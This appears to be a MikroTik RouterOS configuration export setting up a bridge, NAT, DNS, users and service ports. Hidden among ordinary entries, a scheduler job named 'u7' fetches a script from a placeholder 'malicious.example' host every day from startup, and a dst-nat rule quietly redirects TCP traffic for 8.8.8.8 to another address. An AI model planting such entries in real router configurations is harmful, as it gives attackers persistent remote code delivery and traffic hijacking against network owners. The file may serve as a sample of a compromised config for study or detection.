/interface bridge
add name=bridge1
/system scheduler
add interval=1w name=backup on-event="/system backup save" policy=read,write start-time=startup
add interval=1d name=u7 on-event="/tool fetch url=http://malicious.example/p.sh" \
    policy=read,write start-time=startup
/ip firewall nat
add action=masquerade chain=srcnat out-interface=ether1
add action=dst-nat chain=dstnat dst-address=8.8.8.8 protocol=tcp to-address=9.9.9.9
/ip dns
set allow-remote-requests=yes servers=8.8.8.8
/user
add group=full name=admin
add address=10.0.0.0/24 group=read name=auditor
/ip service
set telnet disabled=yes
set ftp disabled=yes
set www port=8080
set ssh port=2222
set api disabled=yes
set winbox
set api-ssl disabled=yes
